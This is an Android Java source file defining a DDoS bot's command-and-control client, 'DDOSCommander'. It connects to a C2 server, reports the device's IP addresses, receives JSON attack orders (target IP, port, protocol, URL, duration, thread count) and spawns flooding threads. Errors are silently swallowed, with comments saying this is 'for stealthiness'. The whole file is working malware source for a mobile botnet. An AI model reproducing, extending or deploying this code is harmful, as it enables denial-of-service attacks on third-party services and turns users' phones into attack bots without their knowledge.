package com.a.androidDDOS;

import android.content.Context;
import android.net.wifi.WifiManager;
import android.text.format.Formatter;
import android.util.Base64;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.util.Enumeration;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import static android.content.Context.WIFI_SERVICE;

public class DDOSCommander implements Runnable {
    private static final String UTF_8 = "UTF-8";
    private PrintWriter out;
    private BufferedReader in;
    private Socket socket;
    private static final String CNC_SERVER_IP = "10.0.2.2";
    private static final int CNC_SERVER_PORT = 8888;
    private Context applicationContext;

    DDOSCommander(Context applicationContext) {
        this.applicationContext = applicationContext;
    }

    @Override
    public void run() {
        try {
            socket = new Socket(CNC_SERVER_IP, CNC_SERVER_PORT);
            out = new PrintWriter(socket.getOutputStream(), true);
            in = new BufferedReader(new InputStreamReader(socket.getInputStream(), UTF_8));

            out.println(Base64.encodeToString((getIpV4Addr() + " " + getLocalIpAddress()).getBytes(), Base64.DEFAULT));
            String jsonFromSocket = in.readLine();

            JSONObject jsonParamsObject = new JSONObject(jsonFromSocket);
            createDdosThreads(jsonParamsObject);

        } catch(Exception e){
            //EMPTY FOR STEALTHINESS PURPOSES
        } finally {
            closeResources();
        }
    }

    private void closeResources() {
        try {
            socket.close();
            out.close();
            in.close();
        } catch (Exception e) {
        //EMPTY FOR STEALTHINESS PURPOSES
        }

    }

    private void createDdosThreads(JSONObject jsonParamsObject) throws JSONException, InterruptedException {
        String destinationIp = jsonParamsObject.getString("destinationIp");
        int duration = jsonParamsObject.getInt("duration");
        String method = jsonParamsObject.getString("method");
        String protocol = jsonParamsObject.getString("protocol");
        String port = jsonParamsObject.getString("port");
        String url = jsonParamsObject.getString("url");
        int threads = jsonParamsObject.getInt("threads");

        ExecutorService threadPool = Executors.newFixedThreadPool(threads);
        for (int i = 0; i < threads; i++) {
            threadPool.submit(new DDOSThread(destinationIp, protocol, port, url, method));
        }
        threadPool.awaitTermination(duration, TimeUnit.SECONDS);
    }


    private String getIpV4Addr() {
        WifiManager wm = (WifiManager) applicationContext.getSystemService(WIFI_SERVICE);
        return Formatter.formatIpAddress(wm.getConnectionInfo().getIpAddress());
    }

    private static String getLocalIpAddress() {
        try {
            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                NetworkInterface intf = en.nextElement();
                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                    InetAddress inetAddress = enumIpAddr.nextElement();
                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                        return inetAddress.getHostAddress();
                    }
                }
            }
        } catch (SocketException ex) { }
        return "";
    }
}
